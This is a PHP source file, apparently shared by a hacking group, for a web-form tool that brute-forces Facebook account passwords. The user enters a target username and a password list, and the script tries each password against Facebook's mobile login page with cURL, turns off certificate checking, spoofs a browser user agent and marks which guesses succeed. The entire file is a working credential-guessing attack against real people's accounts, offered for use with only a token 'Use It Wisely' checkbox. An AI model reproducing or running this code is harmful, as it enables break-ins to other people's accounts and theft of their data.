<?php
// ============================= //
# Facebook Brute Force
# Reedit by kakatoji
# Indo Ghost Cyber
# Use On Localhost
// ============================= //

error_reporting(0);

$user = $_POST['tguser'];
$passlists = $_POST['plists'];

echo '<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook Brute Force</title>
</head>
<body>
<center>
';

if(isset($_POST['startbf']) && !empty($user) && !empty($passlists) && isset($_POST['setuju'])){
$listspass = explode("\r\n", $passlists);
foreach($listspass as $pass){
if(logfb(urlencode($user), urlencode($pass))){
echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="green">True</font><br/>'."\n";
}else{
echo '<font color="blue">'.htmlspecialchars($pass).'</font> <font color="brown">=></font> <font color="red">False</font><br/>'."\n";
}
}
}else{
echo '<form method="POST">
<b><font size="6" color="indigo">Facebook Brute Force</font></b><br/>
<font color="gray">Better Using Localhost</font><br/>
<b>Target Username</b><br/>
<input type="text" size="40" name="tguser" placeholder="Target Username" value="'.htmlspecialchars($user).'"><br/>
<b>Password Lists</b><br/>
<textarea cols="30" rows="8" name="plists" placeholder="pass1
pass2
pass3">'.htmlspecialchars($passlists).'</textarea><br/>
<input type="checkbox" name="setuju" value="Use It Wisely"><font color="blue">Use It Wisely</font><br/>
<input type="submit" name="startbf" value="START">
</form>
';
}

echo '</center>
</body>';

function logfb($login_email, $login_pass){
$cookielog = 'gsh_cookie';
$fp = fopen($cookielog, 'w');
fwrite($fp, '');
fclose($fp);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/login.php');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$login_email.'&pass='.$login_pass.'&login=Login');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookielog);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookielog);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3');
curl_setopt($ch, CURLOPT_REFERER, 'http://m.facebook.com');
$page = curl_exec($ch) or die('<font color="red">Can\'t Connect to Host</font>');
if(eregi('<title>Facebook</title>', $page) || eregi('id="checkpointSubmitButton"', $page)){
return TRUE;
}else{
return FALSE;
}
}
?>